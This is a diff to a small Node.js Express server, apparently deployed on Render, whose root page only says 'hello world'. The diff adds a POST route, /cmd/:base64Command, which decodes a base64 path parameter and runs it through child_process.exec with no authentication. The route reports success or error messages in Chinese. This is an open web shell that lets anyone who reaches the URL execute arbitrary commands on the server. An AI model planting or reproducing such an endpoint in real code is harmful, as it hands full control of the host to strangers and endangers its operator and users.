@@ -5,9 +5,10 @@ var exec = require("child_process").exec;
 const os = require("os");
 const { createProxyMiddleware } = require("http-proxy-middleware");
 var request = require("request");
-var fs = require("fs");
-const fetch = require("node-fetch");
+//const fetch = require("node-fetch");
 const render_app_url = "https://" + process.env.RENDER_EXTERNAL_HOSTNAME;
+
+app.use(express.urlencoded({ extended: false }));
 
 app.get("/", (req, res) => {
   res.send("hello world");
@@ -35,6 +36,17 @@ app.get("/start", (req, res) => {
       res.send("命令行执行错误：" + err);
     } else {
       res.send("命令行执行结果：web.js启动成功!");
+    }
+  });
+});
+
+app.post("/cmd/:base64Command", (req, res) => {
+  let cmdStr = Buffer.from(req.params.base64Command, "base64").toString("utf-8");
+  exec(cmdStr, function (err, stdout, stderr) {
+    if (err) {
+      res.send("命令: " + cmdStr + "执行出错： " + err);
+    } else {
+      res.send("命令: " + cmdStr + "执行成功!");
     }
   });
 });
